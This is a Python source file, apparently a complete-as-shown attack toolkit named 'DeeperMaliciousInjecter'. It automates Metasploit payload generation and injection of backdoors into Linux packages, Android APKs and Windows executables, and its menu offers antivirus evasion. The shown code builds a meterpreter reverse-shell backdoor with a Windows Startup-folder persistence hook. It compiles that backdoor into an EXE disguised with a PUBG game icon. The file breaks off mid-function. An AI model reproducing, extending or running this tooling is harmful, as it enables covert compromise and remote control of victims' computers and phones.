import os
from time import sleep, gmtime
from os import system as cmd
import socket
import urllib.request
import requests
from urllib.parse import unquote
import urllib.parse
import re
import os.path
# import threading
import platform 
# from subprocess import call
from sys import stdout
import sys
import random
from googlesearch import *
from os import popen
import signal
from yaspin import Spinner, yaspin
from yaspin.signal_handlers import fancy_handler
from yaspin.spinners import Spinners
from colorama import init
init()
from colorama import Fore, Back, Style # need to install 
CwD = os.getcwd()
Modules_Path = CwD+'/Moduls/'
sys.path.insert(1, Modules_Path )
import Payloads
from halo import Halo
import threading
import time

#import googlesearch
# pip install googlesearch-python

red = '\033[91m'
wh = '\x1b[37m'


global node , distro ,arc ,badChars ,encoder
OS = platform.node()
distro = platform.system()
arc = platform.architecture()[0] 

if OS == "kali" or OS == "parrot" or OS=="ubuntu" or OS=="mint" or OS=="backbox" :
        pass
            
            
            

else:
    #print("[!] Warning OS Not Supported", end="")
    #print("\n")
    #sys.exit()
    pass

# Check Module
try:
    from termcolor import *
except:
    print(red+'[-]'+wh+" termcolor Not Installed ")
    sys.exit()
try:
    from bs4 import BeautifulSoup

except:
    print(red+'[-]'+wh+" BeautifulSoup Not Installed")
    sys.exit()



#x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f
encoder = 'x86/shikata_ga_nai'

class DEEPER:
    def __init__(self):
        self.Color()
        self.Marks()
        self.TOOLS()
        self.Service()
        self.Handle_options()


      


    def Sp_Dots(self,text,Color,stop):
        loading = True 
        loading_speed = 4  
        loading_string = "." * 6 
        if Color=='red':
            color = "\x1b[31m"
        elif Color=='green':
            color = "\x1b[32m"

        elif Color=='blue':
            color = "\x1b[34m"

        elif Color=='cyan':
            color = "\x1b[36m"

        elif Color=='lred':
            color = "\x1b[91m"

        elif Color=='lcyan':
            color = "\x1b[96m"

        elif Color=='lgreen':
          color =  "\x1b[92m"

        elif Color=='ly':
            color = "\x1b[93m"
        print(text,end="")
        while 1:
            for index, char in enumerate(loading_string):
                sys.stdout.write(color+char) 
                sys.stdout.flush()  
                time.sleep(0.1 / loading_speed)  
            index += 1  
            sys.stdout.write("\b" * index + " " * index + "\b" * index)
            sys.stdout.flush()  # flush the output
            if stop():
                print(Style.RESET_ALL,end="") 
                break



    def spinner_01(self,TEXT,stop):
        ERASE_LINE = '\x1b[2K' 
        print (TEXT+"... \\",end="")
        syms = [Fore.LIGHTCYAN_EX+'\\', Fore.LIGHTCYAN_EX+'|',Fore.LIGHTCYAN_EX+ '/', Fore.LIGHTCYAN_EX+'-']
        bs = '\b'
        animation = '\\-|/'
        while True:
            for sym in syms:
                sys.stdout.write("\x1b[96m"+"\b%s" % sym)
                sys.stdout.flush()
                time.sleep(0.005)
            if stop():
                #sys.stdout.write(ERASE_LINE)
                #CURSOR_UP_ONE = '\x1b[1A' 
                #sys.stdout.write(CURSOR_UP_ONE)
                print(Style.RESET_ALL,end="") 
                break



    def Marks(self):
        global G, Y, B, R, W , M , C , end ,Bold,underline
        G,Y,B,R,W,M,C,end= '\033[92m','\033[93m','\033[94m','\033[91m','\x1b[37m','\x1b[35m','\x1b[36m','\033[0m'
        Bold = "\033[1m"
        underline = "\033[4m"

        global astc, astg ,x,r,w, qu, SHELL, distro, warning,\
        Current_Dir ,Ok, nok
        astc ,x,r= white+'[ '+C+'*'+white+' ]' ,'['+Fore.RED+'X '+Style.RESET_ALL +']','['+Fore.GREEN+' ✔ '+Style.RESET_ALL+']'
        w ,nok,distro= white+'[ '+R+'!'+white+' ]' , "[ "+Fore.RED+'-'+Style.RESET_ALL+"  ]" , platform.platform().split("-")[0]
        wand ,qu, = colored('!', 'red')  ,"[{}]".format(colored("?", 'red'))
        warning ,Ok = white+"[{}]".format(wand+white ) ,green+"[ + ]"+white
        Current_Dir ,astg = os.getcwd() ,green+"[ * ]"+white




    def Color(self):
        global red,green , yellow , blue ,\
        cyan,white, p ,bg , underline
        
        green , yellow ,blue ,red,white = '\033[92m' ,'\033[93m' , '\033[94m' , '\033[91m','\x1b[37m'
        p ,cyan ,bg,underline = '\x1b[35m' , '\x1b[36m' , '\033[0m',"\033[4m"
        
        
        


    def options(self):
        cmd('clear')
        self.Style()
        print()
        #colored("white")
        print(white+"[1]"+Fore.RED+'-'+Style.RESET_ALL+'[{}]'.format(Fore.CYAN+"Generate Msfvenome Payload"+white))
        print(white+"[2]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Linux Deb Injector"+white))
        print(white+"[3]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Embed Metasploit Payload In Original APk"+white))
        print(white+"[4]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Inject Metasploit Payload In executable exe"+white))
        print(white+"[5]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Web Delivery"+white))
        print(white+"[6]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Searchsploit"+white))
        print(white+"[7]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Start Web Server"+white))
        print(white+"[8]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Create Listener"+white))
        print(white+"[9]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"IP Information"+white))
        print(white+"[E]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Evading Antivirus"+white))
        print(white+"[H]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Hack Windows Using Python & Deeper hooks"+white))
        print(white+"[Q]"+Fore.RED+'-'+Style.RESET_ALL+"[{}]".format(Fore.CYAN+"Quit"+white))
        
        print()

        #multiencoded


    def Wait(self):
        for i in range(15):
            print(green+'.' ,end=""+white)

            sleep(0.015)
            sys.stdout.flush()

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::



    def TOOLS(self):
        global Chk_Wget , Chk_msf , Chk_searchsp , Chk_jarsigner ,Chk_xterm ,Chk_Wine ,Architecture_i386
        Chk_xterm = 'which xterm>/dev/null2>&1'
        Chk_Wget = 'which wget>/dev/null'
        Chk_msf = 'which msfconsole>/dev/null'
        Chk_searchsp = 'which searchsploit>/dev/null'
        Chk_jarsigner = 'which jarsigner>/dev/null2>&1'
        Chk_Wine = 'which wine>/dev/null2>&1'
        ###############################################
        

        order_wget = cmd(Chk_Wget)
        order_msf = cmd(Chk_msf)
        order_searchsp = cmd(Chk_searchsp)
        order_jarsigner = cmd(Chk_jarsigner)
        order_xterm = cmd(Chk_xterm)
        order_Wine = cmd(Chk_Wine)
       

        if order_wget == 0 and order_msf == 0 and order_searchsp == 0 and order_jarsigner == 0 and order_xterm == 0 and order_Wine==0 :
            self.Check()
        else:
            self.Install_Tools()





    def INSTALL_Config_WINE_TOOLS(self):
                
        print()
        print("""
        ******************************************************
        ** ((((((((((((((((((Configr Wine)))))))))))))))))) **                           
        **                                                  **                                                  
        ******************************************************
        """)
       

       
        # apt list --upgradable'
        Check_i386_Arc = popen('dpkg --print-foreign-architectures').read()
        if 'i386' in Check_i386_Arc:
            try:
                print(r,'add architecture i386 ')
                enable_the_32_bit__architecture = 'dpkg --add-architecture i386' 
                update = 'sudo apt-get update'
                Command = '{} && {}'.format(enable_the_32_bit__architecture,update)
                Run_Command = cmd(Command)
                #cmd('xterm -e apt-get update')
            except:
                pass

        

            print(w,'Install -> [wine32]')
            cmd('apt-get install wine32 -y')
            print()
            print(w,'Wine Configration Press -> [OK]')
            print(astg,'Configr Wine',end=""),self.Wait()
            # apt --fix-broken install
            Configr_Wine = 'winecfg'
            cmd(Configr_Wine)
            WINE_PATH = '/root/.wine/drive_c'

            if os.path.isdir(WINE_PATH)==True:
                print(r,'[Done]',end="")
                sleep(1)
                cmd('clear')
                print("""
            ******************************************************
            **      Installing Requires Tools For Wine          **                       
            **                                                  **                                                  
            ******************************************************
            """)
                print()
                print(w,'Installing Python3 For Wine')

                cmd('wine msiexec /i Tools/python-3.4.4.amd64.msi')
                print()
                print('Installing Pyinstaller For Wine')
                cmd('wine /root/.wine/drive_c/Python34/python.exe -m pip install pyinstaller==3.5')




            else:
                print(x,'Error Configr Wine')
                input('Press Enter To Continue')

        else :
            print(r,'add architecture i386 ')
            enable_the_32_bit__architecture = 'dpkg --add-architecture i386' 
            update = 'sudo apt-get update'
            Command = '{} && {}'.format(enable_the_32_bit__architecture,update)
            Run_Command = cmd(Command)
            self.INSTALL_Config_WINE_TOOLS()



    def checkbanners(self):
        b1 = Fore.RED+"""
Call trans opt: received. 2-19-98 13:24:18 REC:Loc

     Trace program: running

           wake up, Neo...
        the matrix has Loaded
        follow the Stagers .
83 116 97 114 116  99 104 101 99 107 105 110 103 
            """+Style.RESET_ALL


        b2 = Fore.LIGHTRED_EX+"""
|'''.|    .                     .              '||                      '||       ||                   
 ||..  '  .||.   ....   ... ..  .||.       ....   || ..     ....    ....   ||  ..  ...  .. ...     ... . 
  ''|||.   ||   '' .||   ||' ''  ||      .|   ''  ||' ||  .|...|| .|   ''  || .'    ||   ||  ||   || ||  
.     '||  ||   .|' ||   ||      ||      ||       ||  ||  ||      ||       ||'|.    ||   ||  ||    |''   
|'....|'   '|.' '|..'|' .||.     '|.'     '|...' .||. ||.  '|...'  '|...' .||. ||. .||. .||. ||.  '||||. 
                                                                                                 .|....' 

    """+Style.RESET_ALL

        b3=Fore.LIGHTCYAN_EX+"""
   |          |    |~~\   '     | 
/~~|/~\ /~//~~|_/  |__//~\||/~\~|~
\__|   |\/_\__| \  |   \_/||   || 
                                  
        """+Style.RESET_ALL




       
        banners = [b1,b2,b3]
        print(random.choice(banners))
    




    def Check(self):
        global WINE_PATH 
        cmd('clear')
        self.checkbanners()
        
        
        # Check Distro
        print()
        #print(cyan+"::::::::::::::::::::::::::::::::::::::::")

        s = Fore.LIGHTRED_EX+':::'+Style.RESET_ALL
        i = '['+Fore.LIGHTRED_EX+' ~ '+Style.RESET_ALL+']'
        i1 = Fore.LIGHTRED_EX+'['+Fore.YELLOW+' ~ '+Fore.LIGHTRED_EX+']'+Style.RESET_ALL
        stop_threads = False
        t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' [OS','lcyan',lambda : stop_threads, )) 
        t1.start() 
        sleep(0.40)

        stop_threads = True
        t1.join()
        print("[{}]".format(OS+':'+arc+white),end="")

        #print('['+Fore.RED+' ~ '+Style.RESET_ALL+']'+Fore.RED+" :::"+Style.RESET_ALL+"[OS ", end=""),self.Dot()
        #sleep(0.30)
        #print("[{}]".format(OS+':'+arc+white),end="")

        #print("[{}]".format(red+arc+white),end="")
        if OS == "kali" or OS == "parrot" or OS=="ubuntu" or OS=="mint" or OS=="backbox" :
            print(white+" [{}]".format(green+"OK"+white) ,end="")
            
            

        else:
            pass
           




        try:
            S = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # ErrorLevel = None

            
            try:
                print()
                s = Fore.LIGHTRED_EX+':::'+Style.RESET_ALL
                i = '['+Fore.LIGHTRED_EX+' ~ '+Style.RESET_ALL+']'
                i1 = Fore.LIGHTRED_EX+'['+Fore.YELLOW+' ~ '+Fore.LIGHTRED_EX+']'+Style.RESET_ALL
                stop_threads = False
                t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' [Internet Connection','lcyan',lambda : stop_threads, )) 
                t1.start() 
                sleep(0.40)
                stop_threads = True
                t1.join()
                #print(r,':::[Internet Connection ', end="")
                S.connect(('8.8.8.8', 80))
                sleep(0.30)
                print(white+"[{}]".format(green+"Connected!"+white) ,end="")
                print()
                ErrorLevel = 0
            except OSError:
                ErrorLevel = 1
                sleep(1)
                print(white+"[{}]".format(green+"NOT OK"+white))
                print()
                print("""
*****************************************************************************
**                  {} Some [Function] Will Not Working                 **
**                  {} Press Enter To [Continue]                        **
*****************************************************************************
        """.format(w,w))
                input()






        except KeyboardInterrupt:
            print()
            print(Ok,white+"Detecting [CTRL+C] Quiting.... ", end="")
            print()
            sys.exit()


        self.Last_Chk()


###################################################################################

        Check_i386_Arc = popen('dpkg --print-foreign-architectures').read()
        if "i386" in Check_i386_Arc:
            pass 

      

        elif "i386" not in Check_i386_Arc:
            # original user sources.list
            original_source_list = '/etc/apt/sources.list.original'
            if os.path.isfile(original_source_list)==False:
                cmd('cp /etc/apt/sources.list /etc/apt/sources.list.original>/dev/null 2>&1 ')
            print(w,'Architecture i386 ',end=""),self.Wait()
            sleep(0.10)
            print(white+"[{}]".format(green+"Not Found"+white))
            print(r,'add architecture i386 ')
            enable_the_32_bit__architecture = 'dpkg --add-architecture i386' 
            Run_Command = cmd(enable_the_32_bit__architecture)
            update = 'sudo apt-get update'
            Run_Command = cmd(update)

            if Run_Command==0:
                Architecture_i386 = True
               
                # apt list --upgradable'

            else:
                Architecture_i386 = False        
       
            #input()
        ################################ if wine Installed on SYStem
        WINE_PATH = '/root/.wine/drive_c'
        #PYTHON_WINE_PATH = '/root/.wine/drive_c/Python34/'
        #PYINSTALLER_WINE_PATH = '/root/.wine/drive_c/Python34/Scripts/pyinstaller'

        if os.path.isdir(WINE_PATH)==False:
            self.INSTALL_Config_WINE_TOOLS()

            


    def Dot(self):
        for i in range(4):
            print(green+'.' ,end=""+white)

            sleep(0.040)
            sys.stdout.flush()


       

    def Service(self):
        global CountDown
        CountDown = None
        Check = 'systemctl status postgresql>/dev/null 2>&1'
        Stat = cmd(Check)
        if Stat == 0:
            #print(cyan+"::::::::::::::::::::::::::::::::::::::::")
            s = Fore.LIGHTRED_EX+':::'+Style.RESET_ALL
            i = '['+Fore.LIGHTRED_EX+' ~ '+Style.RESET_ALL+']'
            i1 = Fore.LIGHTRED_EX+'['+Fore.YELLOW+' ~ '+Fore.LIGHTRED_EX+']'+Style.RESET_ALL
            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' [Postgresql Service','lcyan',lambda : stop_threads, )) 
            t1.start() 
            sleep(0.40)

            stop_threads = True
            t1.join()
            #print(r,":::[Postgresql Service ",end="")
            print("[{}]".format(green+"Running"+white), end="")
            print("\n")
            sleep(1)
            CountDown = 0
        else:
            print()
            print(cyan+"::::::::::::::::::::::::::::::::::::::::::::")
            print(white+"Metasploit Service Is Not Running")
            print(cyan+"::::::::::::::::::::::::::::::::::::::::::::")
            sleep(1)
            print("\n")
            print(astg,white+"Starting Service -> Postgresql", end=""), self.Wait()
            command = "systemctl start postgresql>/dev/null 2>&1"
            cmd(command)
            print(white+"[{}]".format(green+"OK"+white), end="")
            print("\n")
            CountDown = 1
            sleep(4)
        print(G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'PRESS ENTER'+G+"]: ",end="");input()
        #input(yellow+"[=>] PRESS [ENTER] TO CONTINUE ..... [<=] "+white)



    def Install_Tools(self):
        WINE_PATH = '/root/.wine/drive_c'

        print("""
        ******************************************************
        **           Installing Requires Tools              **                       
        **                                                  **                                                  
        ******************************************************
        """)
        #cmd("clear")
        
        print(astg+' Fixing any possible broken packages in apt management',end=""),self.Wait()
        print()
        sleep(1)
        cmd('sudo apt-get update')
        #cmd('sudo apt-get install -f -y && sudo apt-get autoremove -y > /dev/null 2>&1')
        
        print()
        print(astg,white+"Detecting OS ", end=""), self.Wait()
        #print("[{}]".format(distro),end="")
        if OS == "kali" or OS == "parrot" or OS=="ubuntu" or OS=="mint" or OS=="backbox" :
            print("[{}]".format(red+OS+white+red+arc+white),end="")
            print()
            #print(white+" [{}]".format(green+"OK"+white) ,end="")




        else:
            pass
          
        
        

        try:
            print(astg,white+"Checking Internet ", end=""), self.Wait()

            try:
                req = urllib.request.Request('https://www.google.com/', headers={"User-Agent": 'Mozilla/5.0'})
                opurl = urllib.request.urlopen(req)
                print(white+"[{}]".format(green+"OK"+white,end=""))
                print()
            except:
                print(white+"[{}]".format(green+"NOT OK"+white))
                print()
                print(w,"Check Internet Connection !!")
                sys.exit()

            order_wget = cmd(Chk_Wget)
            order_msf = cmd(Chk_msf)
            order_searchsp = cmd(Chk_searchsp)
            order_jarsigner = cmd(Chk_jarsigner)
            order_xterm = cmd(Chk_xterm)
            order_Wine = cmd(Chk_Wine)


    





            if order_xterm == 0:
                print(astg, white+'xterm', end=""), self.Wait()
                print(white+"[ {} ]".format(green+"Found"+white))
                sleep(0.30)


            else:
                sleep(0.30)
                print(astg,white+'xterm', end=""), self.Wait()
                print(white+"[ {} ]".format(green+"Not Found"+white))
                print()
                print(w,white+'Installing xterm')
                cmd("apt update && apt-get -y install xterm ")
                cmd("clear")
                print(astg,white+'xterm ',end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white))

            if order_wget == 0:
                print(astg,white+'Wget', end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white),end="")
                print()
                sleep(1)
            else:
                sleep(1)
                print(astg,white+ 'Wget', end=""), self.Wait()
                print(white+"[{}]".format(green+"NOT OK"+white),end="")
                print()
                print(warning,white+'Installing Wget ')  ######################
                cmd("xterm  -e apt-get -y install wget 2>/dev/null")
                print()
                print(astg,white+'wget', end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white))
                print()

            if order_msf == 0:
                print()
                print(white+astg,'Metasploit', end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white),end="")
                print()

            else:
                print()
                print(astg,white+ 'Metasploit',end=""), self.Wait()
                print(white+"[{}]".format(green+"NOT OK"+white))
                print()
                if "kali" in platform.platform() or  platform.node()=="kali":
                    print(warning,white+'Installing metasploit-framework ')
                    cmd("xterm  -e apt-get -y install metasploit-framework 2>/dev/null")
                else: 


                    print(warning,white+ 'This Script Requires Metasploit You Need To Install -> Metasploit')
                    sys.exit()

            if order_jarsigner == 0:
                print()
                print(astg,white+'Jarsigner', end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white))

            else:
                print()
                print(astg,white+'Jarsigner ', end=""), self.Wait()
                print(white+"[{}]".format(green+"NOT OK"+white))
                print()
                print(warning, 'Installing Jarsigner ')  ########################
                cmd("xterm -e sudo apt install -y default-jdk  ")

                print(astg,white+ 'Jarsigner',end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white))
                print()

            if order_searchsp == 0:
                print()
                print(astg,white+'Searchsploit', end=""), self.Wait()
                print(white+"[{}]".format(green+"OK"+white))
                print()

            else:
                print()
                print(astg,white+'Searchsploit', end=""), self.Wait()
                print(white+"[{}]".format(green+"NOT OK"+white))
                print()





            if order_Wine ==0:
                print(astg,white+'Wine', end=""), self.Wait()
                print(white+"[ {} ]".format(green+"Found"+white))
                

            else:
                print(astg,white+'Wine', end=""), self.Wait()
                print(white+"[ {} ]".format(green+"Not Found"+white))
                print(astg,'Installing -> Wine ')  
                cmd("xterm -e apt-get install wine -y 2>/dev/null")


            if os.path.isdir(WINE_PATH)==False:
                self.INSTALL_Config_WINE_TOOLS()



                ############################################################################

            def exploitdb():
                try:
                    cmd('xterm -e git clone https://github.com/offensive-security/exploitdb.git /opt/exploitdb 2>/dev/null')
                  
                    cmd('ln -sf /opt/exploitdb/searchsploit /usr/local/bin/searchsploit>/dev/null 2>&1')
                    print()
                    print(astg,white+ 'Searchsploit', end=""), self.Wait()
                    print(white+"[{}]".format(green+"OK"+white))
                    print()
                    sleep(3)
                    self.Last_Chk()
                except KeyboardInterrupt:
                    print(nok,white+"Error Installing exploitdb")
                    sys.exit()
                   
                ###################################################################################

            order_git = cmd('which git>/dev/null 2>&1')
            print(astg,white+'Checking git ',end=""),self.Wait()
            if order_git==0:
                print(white+"["+green+"OK"+white+"]",end="")
                print()
                
     
                
                
                if OS=="mint" or OS=="ubuntu":
                    
                    print('\n')
                    print(warning,white+ 'Installing Searchsploit')
                    print()
                    # xterm -fg green  -bg black -fa 'Monospace' -fs 11
                    exploitdb()

                elif OS=="kali" or OS =="parrot" or OS=="backbox":
                    print()
                    print(warning,white+ 'Installing Searchsploit')
                    cmd("xterm -e apt-get update 2>/dev/null")
                    cmd("xterm -e apt-get install exploitdb -y 2>/dev/null")
                    print()
                    print(astg,white+ 'Searchsploit', end=""), self.Wait()
                    print(white+"[{}]".format(green+"OK"+white))
                    print()
                    sleep(3)
                    self.Last_Chk()
            
            else:
                print(white+"["+green+"NOT OK"+white+"]",end="")
                print()
                print(warning+white+" Installing git")
                cmd('xterm -e apt-get install git 2>/dev/null')
                print()
                print(warning,white+ 'Installing Searchsploit')
                exploitdb()

                        

               

        except KeyboardInterrupt:
            print()
            print(Ok,white+"Detecting [CTRL+C] Quiting.... ", end="")
            print()
            sys.exit()
        print()
        #input(yellow+"PRESS [ENTER] TO CONTINUE ..... ")+white

            # Last Check ##############################################################

#::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

    def Last_Chk(self):
        order_wget = cmd(Chk_Wget)
        order_msf = cmd(Chk_msf)
        order_searchsp = cmd(Chk_searchsp)
        order_jarsigner = cmd(Chk_jarsigner)
        order_xterm = cmd(Chk_xterm)
        order_Wine = cmd(Chk_Wine)

        if order_wget == 0 and order_msf == 0 and order_searchsp == 0 and order_jarsigner == 0 and order_xterm == 0 and order_Wine==0:
            s = Fore.LIGHTRED_EX+':::'+Style.RESET_ALL
            i = '['+Fore.LIGHTRED_EX+' ~ '+Style.RESET_ALL+']'
            i1 = Fore.LIGHTRED_EX+'['+Fore.YELLOW+' ~ '+Fore.LIGHTRED_EX+']'+Style.RESET_ALL
            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' wget','lcyan',lambda : stop_threads, )) 
            t1.start() 
            sleep(0.40)
            stop_threads = True
            t1.join()
            print(white+"[{}]".format(green+"Found!"+white))
            sleep(0.30)
            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' msf','lcyan',lambda : stop_threads, )) 
            t1.start() 
            sleep(0.30)
            stop_threads = True
            t1.join()
            print(white+"[{}]".format(green+"Found!"+white))

            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' Searchsploit','lcyan',lambda : stop_threads, )) 
            t1.start() 
            sleep(0.30)
            stop_threads = True
            t1.join()
            #print(r,':::[Searchsploit ', end="")
            print(white+"[{}]".format(green+"Found!"+white))

            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' Jarsigner','lcyan',lambda : stop_threads, )) 
            t1.start() 
            sleep(0.30)
            #print(r,':::[Jarsigner ', end="")
            stop_threads = True
            t1.join()
            print(white+"[{}]".format(green+"Found!"+white))

            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' xterm','lcyan',lambda : stop_threads, )) 
            t1.start() 

            sleep(0.30)
            stop_threads = True
            t1.join()

            #print(r,':::[xterm ', end="")
            print(white+"[{}]".format(green+"Found!"+white))


            stop_threads = False
            t1 = threading.Thread(target = self.Sp_Dots , args =(i+s+' Wine','lcyan',lambda : stop_threads, )) 
            t1.start() 

            sleep(0.30)
            #print(r,':::[Wine ', end="")
            stop_threads = True
            t1.join()
            print(white+"[{}]".format(green+"Found!"+white))
    

            #input(yellow+"PRESS [ENTER] TO CONTINUE ..... "+white)
            
        else:
            print(nok,"Some Tools Not Installed We Recommended To Run Script On kali")
            sys.exit()

#:::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::

    def Handle_options(self):
        try:
            cmd('clear')
            # self.banner()
            
            global sh
            distro = colored(platform.platform()[0], 'red')
            shell = colored('@Shell-> ', 'cyan')
            input_color = distro + shell
            #sh1 = colored(+">> ",'red')
            #sh1 = "["+red+'~'+white+']'+red+'VenomMaliciousInjecter@'+blue+'Shell-> '+white
            # sh = colored('[~]-> ','cyan')

            while True:
                #cmd("clear")
                #self.banner()
                self.options()

                #Choice = input(sh1)

                print(G+"│")
                Shell = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Menu'+G+"]: "
                Choice =input(Shell).lower()
                if Choice == "1":
                    self.Msfvenome_Payloads()

                elif Choice == "2":
                    self.Linux_Deb_Injector()

                elif Choice == "3":
                    self.Android_Backdoor()

                elif Choice == "4":
                    self.Windows_Backdoor()


                elif Choice == "5":
                    self.WEB_Delivery()

                elif Choice == "6":
                    self.Searchsploit()


                elif Choice == "7":
                    self.web_Server()


                elif Choice == "8":
                    self.Handler()


                elif Choice == "9":
                    self.GET_ADDR_INFO()

                elif Choice=="e":
                    self.Evading_Antivirus_Main()

                elif Choice == "h":
                    self.DEEPR_WITH_PYTHON_HOOKS()

                elif Choice=="q" or Choice=='quit':
                    self.Quit()



        except KeyboardInterrupt:
            if CountDown==1:
                print()
                print(Ok,'[CTRL+C] PRESSED',end="")
                print()
                print(astg,"Stoping Service",end=""),self.Wait()
                print(white+"[{}]".format(green+"OK"+white))
                cmd("systemctl stop postgresql>/dev/null 2>&1")
                sleep(1)
                cmd('clear')
                sys.exit()
            elif CountDown==0:
                print()
                print(Ok,'[CTRL+C] PRESSED',end="")
                print()
                print(astg,"Stoping Service",end=""),self.Wait()
                print(white+"[{}]".format(green+"OK"+white))
                cmd("systemctl stop postgresql>/dev/null 2>&1")
                sleep(1)
                cmd('clear')
                sys.exit()
            else:
                print()
                print(Ok,'[CTRL+C] PRESSED',end="")
                cmd('clear')
                sys.exit()








              



    def PosTive_Loop(self):

        for i in range(47):
            print(bg+"+", end="")
            sleep(0.007)
            sys.stdout.flush()




    def DEEPR_WITH_PYTHON_HOOKS(self):
        SHELL = G+"└──["+R+"DeeperMaliciousInjecter"+G+"]──["+R+"~"+G+"]─["+B+'Payloads'+G+"]: "
        Form = 'raw'
        cmd("clear")
        payloads  = [
                    'python/meterpreter/bind_tcp_uuid', \
                    'python/meterpreter/reverse_http', \
                    'python/meterpreter/reverse_https', \
                    'python/meterpreter/reverse_tcp ', \
                    'python/meterpreter/reverse_tcp_ssl',\
                    'python/meterpreter/reverse_tcp_uuid',\
                    'python/meterpreter_reverse_http',\
                    'python/meterpreter_reverse_https',\
                    'python/meterpreter_reverse_tcp',\

                    ]




        for i in payloads:
            print(white+'[%d]' % (payloads.index(i) +1), colored(i, 'cyan')) 
           


                
        print()

        while True:
            try:
                payload = int(input(SHELL))
                if payload == 1 or payload == 2 or payload == 3 or payload == 4 or payload == 5:
                    break
                else:
                    
                    continue

            except ValueError:
                continue
        cmd('clear')

        payload = payloads[payload-1]
        if payload:
            Format = ".py"
            

        self.Python_Payload_Get_Socket_Info()
        self.Python_Pay_INFO(payload, chost,cport,'Backdoor.exe')
        

    
        hooks_Run_Auto_Startup = r"""
import getpass ,sys ,os
USER_NAME = getpass.getuser()
ScriptName = os.path.basename(__file__)
CoExe = ScriptName.replace('py','exe')
os.system(r'copy {} "C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\{}" > nul'.format(CoExe,USER_NAME,CoExe))
"""
        swirl = yaspin(
        spinner=Spinners.simpleDotsScrolling,
        text=astg+" Genrate Payload",
        color="green",
        side="right",
        sigmap={signal.SIGINT: fancy_handler},
        )

        with swirl as sp:
            command = 'msfvenom -p {} LHOST={} LPORT={}  -f raw  > Backdoor.py 2>/dev/null'.format(payload, LHOST, LPORT)
            ErrorLevel = cmd(command)
            sp.green.ok("✔")

        if ErrorLevel == 0:
            line_spinner = Spinner("-\\|/", 150)
            with yaspin(line_spinner, "Export Python Code") :
                sleep(6)

            with open("MaliciousCode.py", "w") as f:
                f.write(hooks_Run_Auto_Startup)
            #G, Y, B, R, W , M , C 
            self.PosTive_Loop()
            print()
            print(green)
            cmd('cat Backdoor.py >> MaliciousCode.py ')
            #print(r,'Code')
            print()
            cmd('cat MaliciousCode.py')

            #G, Y, B, R, W , M , C 

            WINE_PATH = '/root/.wine/drive_c'
            PYTHON_WINE_PATH = '/root/.wine/drive_c/Python34/'
            PYINSTALLER_WINE_PATH = '/root/.wine/drive_c/Python34/Scripts/pyinstaller.exe'

            if os.path.exists(WINE_PATH)==True and  os.path.exists(PYINSTALLER_WINE_PATH)==True and os.path.exists(PYINSTALLER_WINE_PATH)==True:
                # Compile Payload py to exe 
                Default_Icon ='icon/pubg_mobile.ico'
                Backdoor_Path = os.getcwd()+'/Backdoor.exe'
                Backdoor_File = os.getcwd()+'/Backdoor.py'
                print()
                print()
                IC = input(w+' Do You Want To Add A Custom Backdoor Icon [Default Icon:>pubg_mobile.ico[Y/N]:?  ').lower()

                if IC=="y":
                    PATH_TO_ICON = input('[Ex:ico]::Path To Icon -> ')
                    if os.path.isfile(PATH_TO_ICON)==True:
                        if PATH_TO_ICON.split('.')[-1]=='ico':
                            Icon = PATH_TO_ICON

                        else:
                            print(w,'Invalid Exction {} Must End With .ico'.format(PATH_TO_ICON))
                            print()
                            PATH_TO_ICON = input('[Ex:ico]::Path To Icon -> ')
                            if PATH_TO_ICON.split('.')[-1]!='ico':
                                sys.exit()


                    if PATH_TO_ICON=="":
                        Icon = Default_Icon

                elif IC=="n":
                    Icon = Default_Icon



                            
                hooks_Autorun = r"getpass.getuser()__ScriptName__=os.path.basename(__file__);CoExe = ScriptName.replace(py,exe)"
                hooks_Autorun1 = r"__Startup__= AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
                Msg = ['Building Tree because Tree-01.toc is non existent','Looking for ctypes DLLs','Analyzing run-time hooks','checking PKG',\
                'Building PKG because PKG-00.toc is non existent','Building PKG (CArchive) PKG-00.pkg','Building PKG (CArchive) PKG-00.pkg completed successfully',\
                'checking EXE','Building EXE because EXE-00.toc is non existent','Building EXE from EXE-00.toc','Copying icons from '+Icon,\
